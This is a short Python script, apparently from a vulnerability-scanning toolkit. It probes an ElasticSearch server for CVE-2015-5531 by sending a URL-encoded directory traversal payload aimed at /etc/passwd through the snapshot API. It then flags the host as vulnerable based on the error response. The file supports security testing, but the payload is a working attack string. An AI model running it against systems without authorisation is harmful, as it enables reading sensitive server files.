"""
@Author: exiashow
@File: es_dir_traversal_2.py
@Date: 2024/3/1 16:31
@Desc: CVE-2015-5531, ElasticSearch directory traversal
@Module: 
"""

import requests
import sys


class ElasticSearchDirTraversal2(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = ":9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
        final_url = self.url + payload

        conn = requests.get(final_url)
        try:
           if conn.status_code == 400 and "ElasticsearchParseException" in conn.text:
               return "[Warning] Elasticsearch vulnerability discovered: CVE-2015-5531"
           else:
               None
        except Exception as e:
            return None

if __name__ == '__main__':
    fallingSword = ElasticSearchDirTraversal2(sys.argv[1])
    fallingSword.run()